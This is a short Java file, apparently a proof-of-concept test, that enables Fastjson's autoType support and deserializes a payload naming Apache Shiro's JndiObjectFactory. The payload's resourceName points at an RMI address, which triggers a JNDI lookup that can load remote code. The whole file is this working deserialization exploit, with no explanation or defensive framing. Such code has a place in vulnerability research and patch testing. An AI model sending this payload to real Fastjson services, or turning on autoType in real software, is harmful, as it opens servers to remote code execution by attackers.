package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class TestJndiObjectFactory {
    public static void main(String[] args) {
        String fastSer =  " {\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"rmi://127.0.0.1:1999/obj\"} ";
        System.out.println(fastSer);
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
        JSON.parseObject(fastSer);
    }
}
